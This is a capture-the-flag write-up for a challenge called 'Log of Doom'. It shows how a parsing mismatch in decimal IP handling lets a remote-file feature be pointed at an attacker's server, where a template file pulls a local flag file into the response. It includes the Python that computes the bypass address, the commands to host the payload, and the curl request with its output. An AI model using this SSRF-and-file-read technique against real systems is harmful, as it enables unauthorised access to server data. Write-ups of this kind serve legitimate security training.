# Log of Doom
This challenge mentions an experimental feature in the logging portion of the mobile backend. Looking at the code we can see the `/vote-logs` endpoint has a section for retrieving votes from a `file` source, along with a note that it's experimental. This section, specifically the `read_vote_file` function, will be our target for this challenge.
### Decimal Addresses
To complete this challenge, we need to send a request to the server with the `file` source type, and a target for the `file_path` with a custom RSU file. The path does accept remote addresses, but it checks to ensure that the address is within the `192.168.100.0/24` address range. It also doesn't allow us to use a domain for the remote address. The function does allow the use of a decimal address rather than an IP string, and it also looks like theres some double handling of addresses in this format. This is where we can take advantage to trick the app into requesting the file from our own server. When checking the IP address is valid, the app converts the number into a bit string, then uses substrings to convert each part of the string to a integer for each address octet. It does not check if the bit string is longer than a regular IP, which means we can pass a much larger number and it will still process it normally. 
```python
bitstring = f"{int(host):032b}"
octet1 = int(bitstring[0:8], 2)
octet2 = int(bitstring[8:16], 2)
octet3 = int(bitstring[16:24], 2)
# Check if in 192.168.100.0/24
if (octet1, octet2, octet3) != (192, 168, 100):
	return {"error": "Only local addresses in 192.168.100.0/24 is allowed for remote RSU files!"}
```
Further down, the decimal is processed again, only this time the integer is bit shifted and masked to obtain the octets instead.
```python
decimal = int(url_parts[2])
octet1 = (decimal >> 24) & 0xFF
octet2 = (decimal >> 16) & 0xFF
octet3 = (decimal >> 8) & 0xFF
octet4 = decimal & 0xFF
url_parts[2] = f"{octet1}.{octet2}.{octet3}.{octet4}"
```
This means that for the initial check, the leftmost portion of the decimal is checked, whereas when converting to the full IP for use, the rightmost portion is used. We can take advantage of this by appending the bit string of our server IP to the bit string of an address in the valid range.
```python
import ipaddress
local_ip = bin(int(ipaddress.ip_address('192.168.100.0')))[2:]
target_ip = bin(int(ipaddress.ip_address('10.0.0.0')))[2:]
print(int(local_ip + target_ip, 2))
```
Now that we have our address, we need to create our RSU file to fetch.
### Experimental Logging
Further down in the `read_vote_file` function, there's a templating feature that allows us to include files on the server in our log results. The source code helps us out here by providing the path we need to include in our file. We don't need to add anything more than the template content as that will give us the flag on its own. Ensure the device you run these commands on has a public IP, as the challenge server will need to be able to reach it. We also can't specify a port in the host so we'll need to host our HTTP server on port 80. 
```shell
dot@stuff-server:~$ echo "{/app/rsu/log_of_doom_flag.txt}" > flag.rsu
dot@stuff-server:~$ python3 -m http.server 80
```
Now that we have a server the challenge can reach, we can use our address from the Python script to create our curl request.
```shell
$ curl http://mobile-app.commission.freedonia.vote/api/admin/vote-logs?source=file&file=http://867653487826042880/flag.rsu
{
	"source": "file",
	"votes": {
		"content": "cysea{maybe_experimental_doesnt_belong_in_production}"
	}
}
```
Whenever you see some data being processed in two different ways it's always a good hint to look a little closer.